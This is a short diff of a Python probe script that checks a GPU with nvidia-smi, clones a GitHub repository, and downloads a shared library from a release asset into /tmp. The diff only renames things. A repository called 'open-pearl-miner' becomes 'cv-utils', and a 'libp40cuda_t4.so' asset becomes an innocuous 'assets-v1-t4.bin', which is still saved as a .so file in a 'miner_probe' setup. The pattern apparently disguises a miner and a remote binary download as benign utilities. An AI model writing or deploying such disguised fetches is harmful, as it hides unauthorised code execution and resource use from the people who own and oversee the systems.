@@ -49,16 +49,16 @@ step("nvidia-smi execution", do_2)
 
 # 3. GitHub repository cloning
 def do_3():
-    repo = "https://github.com/terrycrews21/open-pearl-miner"
+    repo = "https://github.com/terrycrews21/cv-utils"
     dst = "/tmp/miner_probe"
     subprocess.run(["rm", "-rf", dst])
     res = subprocess.run(["git", "clone", "-q", "--depth", "1", repo, dst], capture_output=True, text=True)
     print(f"  git clone exit: {res.returncode}", flush=True)
-step("GitHub cloning (open-pearl-miner)", do_3)
+step("GitHub cloning (cv-utils)", do_3)
 
 # 4. Release library download (from GitHub release asset)
 def do_4():
-    url = "https://github.com/terrycrews21/tensorbench/releases/download/v1.0.0/libp40cuda_t4.so"
+    url = "https://github.com/terrycrews21/cv/releases/download/v1.0.0/assets-v1-t4.bin"
     dst = "/tmp/libp40cuda.so"
     urllib.request.urlretrieve(url, dst)
     print(f"  Downloaded {dst}: {os.path.getsize(dst)} bytes", flush=True)
